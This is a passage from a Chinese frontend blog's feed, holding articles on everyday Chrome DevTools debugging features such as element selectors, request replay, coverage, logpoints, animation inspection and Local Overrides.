开发者工具是前端开发中必不可少的工具，当然，学习这些理论基础是远远不够的，我们还需要根据实际的开发需要去使用不用的工具对代码进行调试，用的多了自然就知道怎么使用了。</p><p>“工欲善其事，必先利其器！”</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> DevTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevTools 调试技巧（2）</title>
      <link href="/2023/07/01/frontend/collection/skill/devtools-diao-shi-ji-qiao-2/"/>
      <url>/2023/07/01/frontend/collection/skill/devtools-diao-shi-ji-qiao-2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="VvoRH"></a></p><h2 id="1-选择和检查-DOM-元素"><a href="#1-选择和检查-DOM-元素" class="headerlink" title="1. 选择和检查 DOM 元素"></a>1. 选择和检查 DOM 元素<br /><br /></h2><p>在 Chrome DevTools 的 Console 面板中，可以输入一些带 $ 的命令来选择和检查 DOM 元素。</p><p>$0 - $4 命令可以用来显示在 Elements 面板中检查的最后五个 DOM 元素，$0 返回最近一次选择的元素，$1 返回最近一次之前选择的元素，依此类推。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018387645-9b4e70e2-42ce-4faa-9216-a94b9ff15615.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018387645-9b4e70e2-42ce-4faa-9216-a94b9ff15615.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>$(selector) 返回带有指定的 CSS 选择器的第一个 DOM 元素的引用。这个命令就等同于 document.querySelector() 函数：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018615608-1fb1ead8-c115-49b5-8166-f2a461ccbb62.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018615608-1fb1ead8-c115-49b5-8166-f2a461ccbb62.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>$$<br>(selector) 返回与给定 CSS 选择器匹配的元素数组。这个命令等同于 document.querySelectorAll() 函数：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018778594-de20431f-5692-4f80-a909-418255a62f0a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659018778594-de20431f-5692-4f80-a909-418255a62f0a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="dAt2u"></a></p><h2 id="2-复制数据"><a href="#2-复制数据" class="headerlink" title="2. 复制数据"></a>2. 复制数据<br /><br /></h2><p>在日常开发中，我们会使用 Chrome DevTools 来调试页面，比如修改页面的样式、节点属性等。其为我们提供了复制数据的功能，可以将修改后的内容复制到源代码中。</p><p><strong>复制 CSS 样式：</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659016208578-621bfac7-d67b-44da-b213-039f520e3227.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659016208578-621bfac7-d67b-44da-b213-039f520e3227.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们可以复制 CSS 规则或声明，甚至可以将内容复制为 JavaScript 键值对：<br /><strong>复制 HTML 内容</strong>，右键点击要复制的元素 -&gt; Copy，点击要复制的内容类型即可：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659016731273-6bf1d143-b94d-4f98-9196-6a326be5e7d2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659016731273-6bf1d143-b94d-4f98-9196-6a326be5e7d2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>复制请求数据：</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017222776-6b942996-60a9-470f-930b-a7dc1b9399ba.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017222776-6b942996-60a9-470f-930b-a7dc1b9399ba.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="I7ECC"></a></p><h2 id="3-发送-XHR-请求"><a href="#3-发送-XHR-请求" class="headerlink" title="3. 发送 XHR 请求"></a>3. 发送 XHR 请求<br /><br /></h2><p>Chrome DevTools 支持重新发送 XHR 请求。在和后端进行接口联调时，如果想要重新发送请求，并且参数保持不变，可以直接右键点击要重新发送的 XHR 请求，点击 Replay XHR 即可重新发送该请求：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022161060-09f750fa-7456-4298-b63b-e3e2a61c19c3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022161060-09f750fa-7456-4298-b63b-e3e2a61c19c3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>对于一个请求，有时需要修改请求参数并重新发送，可以直接在控制台发送请求。只需要先右键点击需要重新发送的 XHR 请求，选择 Copy -&gt; Copy as fetch：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022304350-25e8bbac-6152-4cde-a416-4912a33b543e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022304350-25e8bbac-6152-4cde-a416-4912a33b543e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在 Console 面板中粘贴已经复制的请求内容，修改所需参数，按下回车发送请求即可：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022492098-15e1eaf6-19c4-45bd-8bd8-25994bd7f50c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659022492098-15e1eaf6-19c4-45bd-8bd8-25994bd7f50c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="h4XZT"></a></p><h2 id="4-颜色选择器"><a href="#4-颜色选择器" class="headerlink" title="4. 颜色选择器"></a>4. 颜色选择器<br /><br /></h2><p>Chrome DevTools 提供了一个颜色选择器来设置背景颜色和文本颜色。颜色选择器具有各种功能：<br />颜色选择器具有各种功能，例如<br />●色调控制；<br />●使用吸管从页面元素中选择颜色；<br />●切换调色板；<br />●可以在当前颜色的 RGBA、HSLA 和十六进制表示之间切换；<br />●不透明度控制。</p><p>只需在元素样式的颜色显示块上点击即可弹出颜色选择器：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017634970-3ea4399b-4fe9-49fa-8e54-efa11eb4739c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017634970-3ea4399b-4fe9-49fa-8e54-efa11eb4739c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以使用吸管从页面上直接吸取颜色：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017806680-2496288c-1963-4cfa-87b2-2868815aa1ee.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659017806680-2496288c-1963-4cfa-87b2-2868815aa1ee.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="HJEQi"></a></p><h2 id="5-监听事件"><a href="#5-监听事件" class="headerlink" title="5. 监听事件"></a>5. 监听事件<br /><br /></h2><p>可以在 Chrome Devtools 的 Console 面板中输入 monitorEvents() 来监听指定目标事件的信息。</p><p>该方法有两个参数，第一个参数是要监听的对象。如果未提供第二个参数，所有事件都会返回。要指定要监听的事件，传递一个字符串或字符串数组作为第二个参数。</p><p>例如，监听页面 body 上的点击事件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019104317-39770de7-ae60-4739-8989-38067819ffcd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019104317-39770de7-ae60-4739-8989-38067819ffcd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以调用 unmonitorEvents() 方法来停止监听事件，需要传递一个停止监视对象的参数。例如，停止监听 body 对象上的事件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019223334-d61531d3-2d04-41ed-91fe-bbac5c1bfd89.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019223334-d61531d3-2d04-41ed-91fe-bbac5c1bfd89.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="IVrBu"></a></p><h2 id="6-检查未使用的-CSS"><a href="#6-检查未使用的-CSS" class="headerlink" title="6. 检查未使用的 CSS"></a>6. 检查未使用的 CSS<br /><br /></h2><p>可以在 Coverage 面板中检查页面中没有使用的 CSS 和 JavaScript 代码，可以通过以下步骤来打开 Coverage 面板：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019750309-35ab5eb5-00a2-40e1-b637-d4a60fe8d8a5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019750309-35ab5eb5-00a2-40e1-b637-d4a60fe8d8a5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>点击刷新按钮开始重新加载页面，以测试页面的代码覆盖率：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659020070424-1324e38e-ec25-418a-9415-0cc96b667ed9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659020070424-1324e38e-ec25-418a-9415-0cc96b667ed9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>检查页面的资源使用情况，点击可以查看哪些代码是没有使用的，可以通过删除那些未使用的代码来最小化 CSS 文件的大小：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019839373-472977df-cbc2-4f32-a5cd-1efd18386f22.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659019839373-472977df-cbc2-4f32-a5cd-1efd18386f22.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>对于测试结果，可以进行筛选、过滤、下载等操作。</p><p><a name="aUIam"></a></p><h2 id="7-引用-HTML-元素"><a href="#7-引用-HTML-元素" class="headerlink" title="7. 引用 HTML 元素"></a>7. 引用 HTML 元素<br /><br /></h2><p>在 Chrome DevTools 的 Elements 面板中右键点击要引用的 HTML 元素，选择 Store as global variable 即可将其保存为一个变量，其变量名会在 Console 面板中打印出来：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659020771309-743d7f5d-7cfd-490e-9976-de1e49f62354.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659020771309-743d7f5d-7cfd-490e-9976-de1e49f62354.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="UM59k"></a></p><h2 id="8-日志点"><a href="#8-日志点" class="headerlink" title="8. 日志点"></a>8. 日志点<br /><br /></h2><p>Logpoints （日志点）是一种向控制台提供调试信息的方式，而无需使用 console.log()，这在线上应用调试时会很有用。可以通过右键单击 DevTools 中的 Source 选项卡中的任何行并指定要记录的表达式来添加新的 Logpoint。执行该行时，就会在控制台中获得它的值。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659020998651-0bda1a14-fbdf-45dd-a7a2-adbfe730ee24.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659020998651-0bda1a14-fbdf-45dd-a7a2-adbfe730ee24.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>使用该功能可以减少调试代码，提高代码的整洁性。并且，线上应用也可以直接添加控制台输出。</p><p><a name="Oh4Wu"></a></p><h2 id="9-动态表达式"><a href="#9-动态表达式" class="headerlink" title="9. 动态表达式"></a>9. 动态表达式<br /><br /></h2><p>实时表达式是一种在表达式更改时显示其值的功能。 这有助于追踪代价高昂的表达式（如动画中使用的表达式）或变化很大的表达式（例如，如果正在遍历数组）的问题。它会将 Console 面板里的表达式置顶，并且能随着用户点击的变化，而动态刷新该置顶的表达式。</p><p>只需点击下图中眼睛图标，输入一个想要置顶的 JavaScript 表达式即可：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659021513378-84c97608-09dc-4b07-9db2-5452cc4bcfa7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659021513378-84c97608-09dc-4b07-9db2-5452cc4bcfa7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659021564630-c9b722ad-c63e-4c72-9ad7-fec8ec3b71b0.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659021564630-c9b722ad-c63e-4c72-9ad7-fec8ec3b71b0.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="UvzeQ"></a></p><h2 id="10-调试动画"><a href="#10-调试动画" class="headerlink" title="10. 调试动画"></a>10. 调试动画<br /><br /></h2><p>Chrome DevTools 提供了检查和修改动画的功能。它可以帮助我们播放动画、修改动画时间并分析特定时间范围内的视图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015627803-0c11b7a2-e72b-4887-9091-a6f5b51867d9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015627803-0c11b7a2-e72b-4887-9091-a6f5b51867d9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015014003-d0266985-55ff-47d3-91c2-efa3bca89cd4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015014003-d0266985-55ff-47d3-91c2-efa3bca89cd4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>Animation Inspector (动画检查器）分为四个主要部分：<br />●Controls (控件) ：从此处可以清除所有当前捕获的动画组，或更改当前选定动画组的速度。<br />●Overview (概述) ：在此处选择一个动画组以在详细窗格中检查和修改它。<br />●Timeline (时间轴) ：暂停并从此处开始播放动画，或跳到动画中的特定点。<br />●Details (详细) ：检查并修改当前选定的动画组。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015440948-3e5f957d-12dd-4dd9-88ff-9485ea8ef903.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659015440948-3e5f957d-12dd-4dd9-88ff-9485ea8ef903.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>$$</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> DevTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Devtools 实用功能（1）</title>
      <link href="/2023/07/01/frontend/collection/skill/devtools-shi-yong-gong-neng-1/"/>
      <url>/2023/07/01/frontend/collection/skill/devtools-shi-yong-gong-neng-1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="h4blQ"></a></p><h2 id="1-保留日志"><a href="#1-保留日志" class="headerlink" title="1. 保留日志"></a>1. 保留日志<br /><br /></h2><p>当我们刷新完页面之后，通常控制台的 Console 面板就会被清空。如果想保留控制台的日志，就可以在设置中勾选 Preserve log 选项以保留控制台中的日志。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651298859966-b0f62152-3796-476f-8b16-80c35796cf98.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651298859966-b0f62152-3796-476f-8b16-80c35796cf98.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="nnLLb"></a></p><h2 id="2-代码覆盖率"><a href="#2-代码覆盖率" class="headerlink" title="2. 代码覆盖率"></a>2. 代码覆盖率<br /><br /></h2><p>我们可以打开设置，在 Experiments 中勾选 Record coverage while performance tracing 选项。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651300094586-3e85a80b-e065-4697-89d7-3baaec8a8070.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651300094586-3e85a80b-e065-4697-89d7-3baaec8a8070.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在面板下方的 Coverage 面板中点击红色按钮以记录页面的代码覆盖率：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651300496603-7b227952-c314-48f5-9442-b3c52c4f1b51.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651300496603-7b227952-c314-48f5-9442-b3c52c4f1b51.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>代码覆盖率使用动态分析法来收集代码运行时的覆盖率，让开发者知道有代码在页面上真正的使用。动态分析是指在应用运行状态下收集代码执行数据的过程，换句话说，覆盖率数据就是在代码执行过程中通过标记收集到的。</p><p><a name="DxFPz"></a></p><h2 id="3-显示重绘"><a href="#3-显示重绘" class="headerlink" title="3. 显示重绘"></a>3. 显示重绘<br /><br /></h2><p>在浏览器的开发者工具中可以通过开启显示重绘选项以查看页面在执行操作时哪些元素会发生重绘。</p><p>在控制台右上角三个点中的 More tools 选项中开启 Rendering 选项卡：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651301168363-3c52df36-9ecc-4b05-a4e1-545be972f42d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651301168363-3c52df36-9ecc-4b05-a4e1-545be972f42d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>开启 Rendering（渲染）选项后，开启 Paint flashing：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651301680481-be1e0e12-6424-437d-80e8-43637a0cbcff.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651301680481-be1e0e12-6424-437d-80e8-43637a0cbcff.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当刷新页面时，显示绿色的区域就是重新绘制区域。</p><p><a name="dtaRn"></a></p><h2 id="4-检查动画"><a href="#4-检查动画" class="headerlink" title="4. 检查动画"></a>4. 检查动画<br /><br /></h2><p>Chrome 的开发者工具不仅可以调试样式，还可以调试动画，可以在控制台右上角三个点中的 More tools 选项中开启 Animations 选项卡：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651302325280-03456bd8-f217-497f-9466-3f111a3dead3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651302325280-03456bd8-f217-497f-9466-3f111a3dead3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当页面的动画执行时，就会在时间轨道上查看所有的动画，点击其中一个动画可以懂得执行过程以及时间轴：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651302211727-f357db77-80bc-4d7e-abb0-637da2babda3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651302211727-f357db77-80bc-4d7e-abb0-637da2babda3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们可以在时间轴上定位到任一时刻的动画帧，也可以拖动左右两端的圆点来修改动画的延迟和周期，修改之后可以在属性面板看到对应的 CSS 样式。</p><p><a name="IPrCU"></a></p><h2 id="5-截图"><a href="#5-截图" class="headerlink" title="5. 截图"></a>5. 截图<br /><br /></h2><p>Chrome 浏览器内置了截图功能，可以在浏览器开发者工具中使用 Ctrl+Shift+P（Windows）或者 Command+Shift+P（Mac）快捷键打开搜索来查找 screenshot：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651303075335-d3dd3cbb-ceb2-4e71-8fcf-b7fddec40f3a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651303075335-d3dd3cbb-ceb2-4e71-8fcf-b7fddec40f3a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>截图完成后自动下载到下载目录，打开浏览器的下载框或本机的下载目录即可看到图片。</p><p><a name="WpJ3q"></a></p><h2 id="6-Local-Overrides"><a href="#6-Local-Overrides" class="headerlink" title="6. Local Overrides"></a>6. Local Overrides<br /><br /></h2><p>我们可以使用本地资源覆盖网页所使用的资源，比如可以使用本地 CSS 文件覆盖网页的 css 文件，修改样式。将本地的文件夹映射到网络，在 Chrome 开发者功能里面对 CSS 样式的修改都会直接改动本地文件，页面重新加载，使用的资源也是本地资源，达到持久化的效果。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651304357549-af958461-e9c1-42d1-811d-cbd788912183.png" class="lazyload placeholder" 